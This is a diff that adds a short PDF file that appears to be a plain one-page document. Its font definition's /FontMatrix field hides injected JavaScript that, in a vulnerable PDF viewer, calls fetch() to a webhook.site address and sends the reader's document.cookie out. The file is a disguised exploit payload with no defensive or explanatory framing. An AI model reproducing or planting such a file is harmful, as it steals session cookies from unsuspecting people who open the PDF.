@@ -1,0 +1,19 @@
+%PDF-1.7
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Count 1 /Kids [3 0 R] >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> >>
+endobj
+4 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica
+/FontMatrix [ 0.001 0 0 0.001 0 (c);fetch('https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3?c='+document['cookie']);(
+) ]
+>>
+endobj
+trailer
+<< /Root 1 0 R >>
+%%EOF
